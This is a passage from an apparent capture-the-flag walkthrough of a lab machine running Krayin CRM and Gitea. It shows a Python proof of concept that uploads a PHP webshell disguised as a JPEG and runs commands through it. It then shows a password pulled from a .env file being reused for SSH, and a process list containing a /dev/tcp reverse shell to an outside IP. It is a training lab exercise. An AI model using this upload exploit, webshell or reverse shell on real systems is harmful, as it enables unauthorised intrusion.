    epilog="Example:\n  python3 exploit.py -t http://krayin.example.com -u admin@example.com -p password123 -c id\n\nNote: Do not include a trailing slash in the URL."
)
parser.add_argument("-t", required=True, help="Target URL (e.g. http://krayin.example.com)")
parser.add_argument("-u", required=True, help="Username/email")
parser.add_argument("-p", required=True, help="Password")
parser.add_argument("-c", required=True, help="Command to execute")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

TARGET = args.t.rstrip("/")

session = requests.Session()
```

Next it gets the login page to fetch the XSRF token:

```python
r = session.get(f"{TARGET}/admin/login")
token_match = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
form_token = token_match.group(1)
xsrf = urllib.parse.unquote(session.cookies.get("XSRF-TOKEN"))
```

Then it logs in using the given creds:

```python
r = session.post(f"{TARGET}/admin/login",
    json={"_token": form_token, "email": args.u, "password": args.p},
    headers={
        "X-XSRF-TOKEN": xsrf,
        "Referer": f"{TARGET}/admin/login",
        "Accept": "application/json",
        "X-Requested-With": "XMLHttpRequest",
    }
)
```

It gets the new XSRF token from the session cookies, and then makes the upload:

```python
xsrf = urllib.parse.unquote(session.cookies.get("XSRF-TOKEN"))

r = session.post(f"{TARGET}/admin/tinymce/upload",
    files={"file": ("shell.php", b"<?php system($_GET['cmd']); ?>", "image/jpeg")},
    headers={"X-XSRF-TOKEN": xsrf}
)
```

From the reply, it tries to get the location of the uploaded file, and if it exists, it runs the command (using `curl` in a subprocess for some reason) via the webshell:

```python
location = r.json().get("location")
if location:
    url = f"{location}?cmd={urllib.parse.quote(args.c)}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    print(result.stdout)
else:
    print(f"[-] Upload failed: {r.status_code}")
```

#### Test

I’ll download this script and save it as `poc.py`. I’ll add the metadata so that it has access to the requests package (see my [uv cheatsheet](https://0xdf.gitlab.io/cheatsheets/uv#add-meta) for details), and run it:

```sql
oxdf@hacky$ uv add --script poc.py requests
Updated `poc.py`
oxdf@hacky$ uv run poc.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -c id
Installed 5 packages in 8ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)

oxdf@hacky$ uv run poc.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -c pwd
/var/www/krayin/storage/app/public/tinymce
```

It works great!

## Shell as jones

### Enumeration

#### Not Container

Despite the fact that Gitea had a `docker-compose.yml` file, this does not appear to be a container. The hostname is nexus, and the IP is the IP assigned from HTB:

```ruby
www-data@nexus:/$ ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.234.54  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::a0de:adff:fe20:e878  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::a0de:adff:fe20:e878  prefixlen 64  scopeid 0x20<link>
        ether a2:de:ad:20:e8:78  txqueuelen 1000  (Ethernet)
        RX packets 201117  bytes 13024116 (13.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14174  bytes 6472532 (6.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

#### Users

There are two users with home directories in `/home`:

```bash
www-data@nexus:/home$ ls
git  jones
```

www-data can’t access either of them.

These two users, along with root, have shells configured in `passwd`:

```bash
www-data@nexus:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

#### Web

www-data’s home directory is `/var/www`, which has two directories:

```
www-data@nexus:~$ ls
html  krayin
```

`html` has the default `nginx` page, as the static index page for the main site:

```ruby
www-data@nexus:~$ ls html/
index.nginx-debian.html  nexus
www-data@nexus:~$ ls html/nexus/
index.html
```

The `krayin` folder has the Krayin install:

```ruby
www-data@nexus:~/krayin$ ls -a 
.               CODE_OF_CONDUCT.md  composer.json  packages     tests
..              LICENSE             composer.lock  phpunit.xml  vendor
.editorconfig   README.md           config         pint.json    vite.config.js
.env            UPGRADE.md          database       public
.env.example    app                 example.txt    resources
.gitattributes  artisan             lang           routes
.gitignore      bootstrap           package.json   storage
```

The `.env` file has the database connection information:

```bash
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD

VITE_HOST=
VITE_PORT=

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=

BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com

MAIL_RECEIVER_DRIVER=sendgrid

IMAP_HOST=imap.example.com
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=your_username
IMAP_PASSWORD=your_password

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

### su / SSH

Before connecting to the database, I’ll try that password with the user on the box, jones:

```
www-data@nexus:/$ su - jones
Password: 
jones@nexus:~$
```

It works!

It also works over SSH:

```ruby
oxdf@hacky$ sshpass -p 'y27xb3ha!!74GbR' ssh jones@nexus.htb
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
...[snip]...
jones@nexus:~$ 
```

Either way I can grab `user.txt`:

```
jones@nexus:~$ cat user.txt
e1d7c9b1************************
```

## Shell as root

### Enumeration

#### Home Directory

jones’ home directory is very empty:

```sql
jones@nexus:~$ ls -la
total 28
drwxr-x--- 3 jones jones 4096 May 12 12:26 .
drwxr-xr-x 4 root  root  4096 May 12 12:06 ..
lrwxrwxrwx 1 root  root     9 May 12 12:26 .bash_history -> /dev/null
-rw-r--r-- 1 jones jones  220 Mar 23 10:45 .bash_logout
-rw-r--r-- 1 jones jones 3771 Mar 23 10:45 .bashrc
drwx------ 2 jones jones 4096 May 12 12:06 .cache
-rw-r--r-- 1 jones jones  807 Mar 23 10:45 .profile
-rw-r----- 1 root  jones   33 Aug 30 11:37 user.txt
```

#### Processes

The process list is also very empty:

```bash
jones@nexus:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3  22352 13504 ?        Ss   11:36   0:05 /sbin/init
root           2  0.0  0.0      0     0 ?        S    11:36   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        S    11:36   0:00 [pool_workqueue_release]
root           4  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-rcu_g]
root           5  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-rcu_p]
root           6  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-slub_]
root           7  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-netns]
root          10  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/0:0H-kblockd]
root          12  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-mm_pe]
root          13  0.0  0.0      0     0 ?        I    11:36   0:00 [rcu_tasks_kthread]
root          14  0.0  0.0      0     0 ?        I    11:36   0:00 [rcu_tasks_rude_kthread]
root          15  0.0  0.0      0     0 ?        I    11:36   0:00 [rcu_tasks_trace_kthread]
root          16  0.0  0.0      0     0 ?        S    11:36   0:00 [ksoftirqd/0]
root          17  0.0  0.0      0     0 ?        R    11:36   0:04 [rcu_preempt]
root          18  0.0  0.0      0     0 ?        S    11:36   0:00 [migration/0]
root          19  0.0  0.0      0     0 ?        S    11:36   0:00 [idle_inject/0]
root          20  0.0  0.0      0     0 ?        S    11:36   0:00 [cpuhp/0]
root          21  0.0  0.0      0     0 ?        S    11:36   0:00 [cpuhp/1]
root          22  0.0  0.0      0     0 ?        S    11:36   0:00 [idle_inject/1]
root          23  0.0  0.0      0     0 ?        S    11:36   0:00 [migration/1]
root          24  0.0  0.0      0     0 ?        S    11:36   0:00 [ksoftirqd/1]
root          26  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/1:0H-events_highpri]
root          29  0.0  0.0      0     0 ?        S    11:36   0:00 [kdevtmpfs]
root          30  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-inet_]
root          31  0.0  0.0      0     0 ?        R    11:36   0:00 [kauditd]
root          32  0.0  0.0      0     0 ?        S    11:36   0:00 [khungtaskd]
root          33  0.0  0.0      0     0 ?        S    11:36   0:00 [oom_reaper]
root          35  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-write]
root          37  0.0  0.0      0     0 ?        S    11:36   0:00 [kcompactd0]
root          38  0.0  0.0      0     0 ?        SN   11:36   0:00 [ksmd]
root          40  0.0  0.0      0     0 ?        SN   11:36   0:00 [khugepaged]
root          41  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-kinte]
root          42  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-kbloc]
root          43  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-blkcg]
root          44  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/9-acpi]
root          45  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-tpm_d]
root          46  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-ata_s]
root          47  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-md]
root          48  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-md_bi]
root          49  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-edac-]
root          50  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-devfr]
root          51  0.0  0.0      0     0 ?        S    11:36   0:00 [watchdogd]
root          52  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-quota]
root          54  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/1:1H-kblockd]
root          55  0.0  0.0      0     0 ?        S    11:36   0:00 [kswapd0]
root          56  0.0  0.0      0     0 ?        S    11:36   0:00 [ecryptfs-kthread]
root          57  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-kthro]
root          58  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/24-pciehp]
root          59  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/25-pciehp]
root          60  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/26-pciehp]
root          61  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/27-pciehp]
root          62  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/28-pciehp]
root          63  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/29-pciehp]
root          64  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/30-pciehp]
root          65  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/31-pciehp]
root          66  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/32-pciehp]
root          67  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/33-pciehp]
root          68  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/34-pciehp]
root          69  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/35-pciehp]
root          70  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/36-pciehp]
root          71  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/37-pciehp]
root          72  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/38-pciehp]
root          73  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/39-pciehp]
root          74  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/40-pciehp]
root          75  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/41-pciehp]
root          76  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/42-pciehp]
root          77  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/43-pciehp]
root          78  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/44-pciehp]
root          79  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/45-pciehp]
root          80  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/46-pciehp]
root          81  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/47-pciehp]
root          82  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/48-pciehp]
root          83  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/49-pciehp]
root          84  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/50-pciehp]
root          85  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/51-pciehp]
root          86  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/52-pciehp]
root          87  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/53-pciehp]
root          88  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/54-pciehp]
root          89  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/55-pciehp]
root          90  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-acpi_]
root          92  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_0]
root          93  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root          94  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_1]
root          95  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root          97  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-mld]
root          99  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-ipv6_]
root         100  0.0  0.0      0     0 ?        I    11:36   0:00 [kworker/u4:1-ext4-rsv-conversion]
root         107  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-kstrp]
root         109  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/u7:0]
root         110  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/u8:0]
root         111  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/u9:0]
root         124  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-charg]
root         156  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/0:1H]
root         175  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_2]
root         176  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         182  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_3]
root         183  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-mpt_p]
root         184  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-mpt/0]
root         185  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         186  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_4]
root         187  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         189  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_5]
root         193  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         194  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_6]
root         195  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         196  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_7]
root         197  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         198  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_8]
root         201  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         202  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_9]
root         203  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         204  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_10]
root         206  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         211  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_11]
root         213  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         214  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_12]
root         215  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         216  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_13]
root         217  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         218  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_14]
root         219  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         220  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_15]
root         221  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         222  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_16]
root         223  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         224  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_17]
root         225  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         226  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_18]
root         227  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         228  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_19]
root         229  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         230  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_20]
root         231  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         232  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_21]
root         233  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         234  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_22]
root         235  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         236  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_23]
root         237  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         238  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_24]
root         239  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         240  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_25]
root         241  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         242  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_26]
root         243  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         244  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_27]
root         245  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         246  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_28]
root         247  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         248  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_29]
root         249  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         250  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_30]
root         251  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         252  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_31]
root         253  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         283  0.0  0.0      0     0 ?        S    11:36   0:00 [scsi_eh_32]
root         284  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-scsi_]
root         312  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-raid5]
root         354  0.0  0.0      0     0 ?        S    11:36   0:01 [jbd2/sda4-8]
root         355  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-ext4-]
root         401  0.0  0.4  50500 16520 ?        S<s  11:36   0:01 /usr/lib/systemd/systemd-journald
root         458  0.0  0.2  30008  8712 ?        Ss   11:36   0:00 /usr/lib/systemd/systemd-udevd
root         461  0.0  0.0      0     0 ?        S    11:36   0:00 [psimon]
root         543  0.0  0.0      0     0 ?        S    11:36   0:00 [jbd2/sda2-8]
root         544  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-ext4-]
root         563  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/60-vmw_vmci]
root         564  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/61-vmw_vmci]
systemd+     594  0.0  0.3  21588 12984 ?        Ss   11:36   0:00 /usr/lib/systemd/systemd-resolved
systemd+     597  0.0  0.1  91028  7816 ?        Ssl  11:36   0:01 /usr/lib/systemd/systemd-timesyncd
root         603  0.0  0.0  85900  2956 ?        D<sl 11:36   0:02 /sbin/auditd
_laurel      608  0.0  0.1  10088  6360 ?        D<   11:36   0:03 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         640  0.0  0.0      0     0 ?        S    11:36   0:00 [irq/16-vmwgfx]
root         642  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-ttm]
root         660  0.0  0.0      0     0 ?        S    11:36   0:00 [audit_prune_tree]
root         671  0.0  0.0      0     0 ?        I<   11:36   0:00 [kworker/R-crypt]
root         785  0.0  0.2  53468 12028 ?        Ss   11:36   0:00 /usr/bin/VGAuthService
root         786  0.0  0.2 317204 10608 ?        Ssl  11:36   0:29 /usr/bin/vmtoolsd
root         812  0.0  0.0   4068  3224 ?        Ss   11:36   0:00 dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
message+     852  0.0  0.1   9812  5392 ?        Ss   11:36   0:01 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
polkitd      910  0.0  0.1 308164  8004 ?        Ssl  11:36   0:00 /usr/lib/polkit-1/polkitd --no-debug
root         937  0.0  0.2  18200  8808 ?        Ss   11:36   0:00 /usr/lib/systemd/systemd-logind
root         941  0.0  0.3 468972 13456 ?        Ssl  11:36   0:00 /usr/libexec/udisks2/udisksd
syslog       963  0.0  0.1 222508  6592 ?        Ssl  11:36   0:00 /usr/sbin/rsyslogd -n -iNONE
root        1093  0.0  0.3 318364 12860 ?        Ssl  11:36   0:00 /usr/sbin/ModemManager
root        1356  0.0  0.0      0     0 ?        I    11:36   0:00 [kworker/u4:2-ext4-rsv-conversion]
git         1412  0.1  3.8 2026508 156168 ?      Ssl  11:36   0:43 /usr/local/bin/gitea web --config /etc/gitea/app.ini
root        1427  0.0  0.0   6824  2856 ?        Ss   11:36   0:00 /usr/sbin/cron -f -P
root        1440  0.0  0.8 233244 33760 ?        Ss   11:36   0:02 php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)
root        1471  0.0  0.0  11304  1904 ?        Ss   11:36   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1472  0.0  0.1  13284  6020 ?        S    11:36   0:00 nginx: worker process
www-data    1473  0.0  0.1  13300  6028 ?        S    11:36   0:00 nginx: worker process
root        1478  0.0  0.0   6104  1996 tty1     Ss+  11:36   0:00 /sbin/agetty -o -p -- \u --noclear - linux
www-data    1490  0.0  1.5 237604 62448 ?        S    11:36   0:01 php-fpm: pool www
mysql       1524  0.6 11.0 1794876 441824 ?      Ssl  11:36   3:30 /usr/sbin/mysqld
root        1985  0.0  1.0 616900 43352 ?        Ssl  12:25   0:02 /usr/libexec/fwupd/fwupd
root        1992  0.0  0.2 313832  8872 ?        Ssl  12:25   0:00 /usr/libexec/upowerd
www-data    2380  0.0  1.5 235440 62168 ?        S    13:34   0:01 php-fpm: pool www
www-data    4266  0.0  1.3 237144 54760 ?        S    18:50   0:00 php-fpm: pool www
www-data    4310  0.0  0.0   2800  1816 ?        S    19:02   0:00 sh -c -- bash -c "bash -i >& /dev/tcp/10.10.15.169/443 0>&1"
www-data    4311  0.0  0.0   4324  3368 ?        S    19:02   0:00 bash -c bash -i >& /dev/tcp/10.10.15.169/443 0>&1
www-data    4312  0.0  0.0   4588  3896 ?        S    19:02   0:00 bash -i
www-data    4316  0.0  0.0   2716  1816 ?        S    19:03   0:00 script /dev/null -c bash
www-data    4317  0.0  0.0   2800  1808 pts/0    Ss   19:03   0:00 sh -c bash
www-data    4318  0.0  0.0   4588  3988 pts/0    S    19:03   0:00 bash
root        4482  0.0  0.1   6780  4564 pts/0    S    19:23   0:00 su - jones
root        4484  0.0  0.0      0     0 ?        S    19:23   0:00 [psimon]
jones       4486  0.0  0.2  20300 11332 ?        Ss   19:23   0:00 /usr/lib/systemd/systemd --user
jones       4489  0.0  0.0  21156  3564 ?        S    19:23   0:00 (sd-pam)
jones       4500  0.0  0.1   8636  5528 pts/0    S+   19:23   0:00 -bash
root        4513  0.0  0.2  12024  8208 ?        Ss   19:24   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        4514  0.0  0.2  14960 10568 ?        Ss   19:24   0:00 sshd: jones [priv]
jones       4611  0.0  0.1  15120  7136 ?        S    19:24   0:00 sshd: jones@pts/1
jones       4614  0.0  0.1   8672  5644 pts/1    Ss   19:24   0:00 -bash
root        4670  0.0  0.0      0     0 ?        I    19:29   0:00 [kworker/u6:3-flush-8:0]
root        4841  0.1  0.0      0     0 ?        I    19:50   0:04 [kworker/1:3-events]
root        5010  0.0  0.0      0     0 ?        I    20:17   0:00 [kworker/u6:4-events_unbound]
root        5015  0.0  0.0      0     0 ?        I    20:19   0:00 [kworker/u5:3-flush-8:0]
root        5025  0.2  0.0      0     0 ?        I    20:22   0:03 [kworker/0:3-events]
root        5028  0.0  0.0      0     0 ?        I    20:23   0:00 [kworker/u5:4-events_power_efficient]
root        5066  0.0  0.0      0     0 ?        I    20:29   0:00 [kworker/0:2-cgroup_free]
root        5073  0.0  0.0      0     0 ?        I    20:31   0:00 [kworker/u6:1-events_unbound]
root        5094  0.0  0.0      0     0 ?        I    20:38   0:00 [kworker/1:0-cgroup_free]
root        5095  0.0  0.0      0     0 ?        I    20:38   0:00 [kworker/1:2-cgroup_free]
root        5151  0.0  0.0      0     0 ?        I    20:40   0:00 [kworker/u5:0-events_unbound]
root        5157  0.0  0.0      0     0 ?        I    20:42   0:00 [kworker/0:0]
root        5167  0.0  0.0      0     0 ?        I    20:45   0:00 [kworker/1:1-cgroup_release]
root        5168  0.0  0.0      0     0 ?        I    20:45   0:00 [kworker/u5:1-events_power_efficient]
root        5171  0.0  0.0      0     0 ?        I    20:46   0:00 [kworker/0:1-cgroup_free]
jones       5184 50.0  0.1  10884  4540 pts/1    R+   20:47   0:00 ps auxww
```

Gitea is running, as is Nginx. But nothing else super interesting.

There are no interesting crons, but there are 19 systemd timers:

```yaml
jones@nexus:~$ systemctl list-timers --all --no-pager
NEXT                             LEFT LAST                              PASSED UNIT                           ACTIVATES                       
Sun 2026-08-30 20:51:07 UTC        5s Sun 2026-08-30 20:50:07 UTC      54s ago gitea-template-sync.timer      gitea-template-sync.service
Sun 2026-08-30 20:54:50 UTC  3min 48s Mon 2025-03-31 16:38:00 UTC            - apt-daily.timer                apt-daily.service
Sun 2026-08-30 21:00:00 UTC      8min Sun 2026-08-30 20:50:07 UTC      54s ago sysstat-collect.timer          sysstat-collect.service
Sun 2026-08-30 21:09:00 UTC     17min Sun 2026-08-30 20:39:06 UTC    11min ago phpsessionclean.timer          phpsessionclean.service
Sun 2026-08-30 21:36:47 UTC     45min Sun 2026-08-30 20:07:18 UTC    43min ago fwupd-refresh.timer            fwupd-refresh.service
Mon 2026-08-31 00:00:00 UTC   3h 8min Sun 2026-08-30 11:36:28 UTC       9h ago dpkg-db-backup.timer           dpkg-db-backup.service
Mon 2026-08-31 00:00:00 UTC   3h 8min Sun 2026-08-30 11:36:28 UTC       9h ago logrotate.timer                logrotate.service
Mon 2026-08-31 00:07:00 UTC  3h 15min -                                      - sysstat-summary.timer          sysstat-summary.service
Mon 2026-08-31 00:45:07 UTC  3h 54min Sun 2026-08-30 11:59:25 UTC       8h ago fstrim.timer                   fstrim.service
Mon 2026-08-31 03:47:40 UTC        6h Sun 2026-08-30 19:30:12 UTC 1h 20min ago motd-news.timer                motd-news.service
Mon 2026-08-31 04:50:36 UTC        7h Sun 2026-08-30 16:26:33 UTC 4h 24min ago man-db.timer                   man-db.service
Mon 2026-08-31 06:01:54 UTC        9h Sun 2026-08-30 11:36:45 UTC       9h ago apt-daily-upgrade.timer        apt-daily-upgrade.service
Mon 2026-08-31 11:41:25 UTC       14h Sun 2026-08-30 11:41:25 UTC       9h ago update-notifier-download.timer update-notifier-download.service
Mon 2026-08-31 11:51:25 UTC       15h Sun 2026-08-30 11:51:25 UTC       8h ago systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
Tue 2026-09-01 11:01:26 UTC 1 day 14h Mon 2026-03-23 10:50:29 UTC            - update-notifier-motd.timer     update-notifier-motd.service
Sun 2026-09-06 03:10:10 UTC    6 days Sun 2026-08-30 11:37:05 UTC       9h ago e2scrub_all.timer              e2scrub_all.service
